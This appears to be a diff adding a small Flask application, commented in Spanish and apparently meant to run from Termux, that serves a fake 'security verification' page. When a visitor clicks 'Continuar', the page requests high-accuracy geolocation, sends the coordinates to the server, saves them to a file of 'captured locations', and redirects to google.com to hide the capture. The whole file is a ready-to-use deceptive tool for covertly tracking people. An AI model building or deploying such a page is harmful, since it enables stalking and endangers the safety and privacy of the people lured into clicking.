@@ -1,0 +1,75 @@
+from flask import Flask, render_template_string, request, jsonify
+
+app = Flask(__name__)
+
+# Código HTML básico con JavaScript para pedir la geolocalización
+HTML_PAGE = """
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>Verificación</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; background: #121212; color: #fff; }
+        button { padding: 10px 20px; font-size: 16px; background: #ff4444; color: white; border: none; cursor: pointer; border-radius: 5px; }
+        button:hover { background: #cc0000; }
+    </style>
+</head>
+<body>
+    <h2>Verificación de Seguridad</h2>
+    <p>Haz clic en el botón para continuar:</p>
+    <button onclick="obtenerUbicacion()">Continuar</button>
+
+    <script>
+        function obtenerUbicacion() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(enviarCoordenadas, errorUbicacion, {
+                    enableHighAccuracy: true
+                });
+            } else {
+                alert("Geolocalización no soportada en este navegador.");
+            }
+        }
+
+        function enviarCoordenadas(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+
+            // Envía los datos por POST a nuestro servidor Flask
+            fetch('/guardar', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ latitud: lat, longitud: lon })
+            }).then(response => {
+                window.location.href = "https://www.google.com"; // Redirige a otra web después de capturar
+            });
+        }
+
+        function errorUbicacion(error) {
+            alert("Se requiere permiso de ubicación para continuar.");
+        }
+    </script>
+</body>
+</html>
+"""
+
+@app.route('/')
+def index():
+    return render_template_string(HTML_PAGE)
+
+@app.route('/guardar', methods=['POST'])
+def guardar():
+    datos = request.json
+    lat = datos.get('latitud')
+    lon = datos.get('longitud')
+
+    # Imprime las coordenadas en la consola de tu Termux y las guarda en un archivo de texto
+    print(f"\n[!] ¡Coordenadas recibidas! Latitud: {lat}, Longitud: {lon}")
+
+    with open("ubicaciones_capturadas.txt", "a") as f:
+        f.write(f"Lat: {lat}, Lon: {lon}\n")
+
+    return jsonify({"status": "success"})
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=5000)
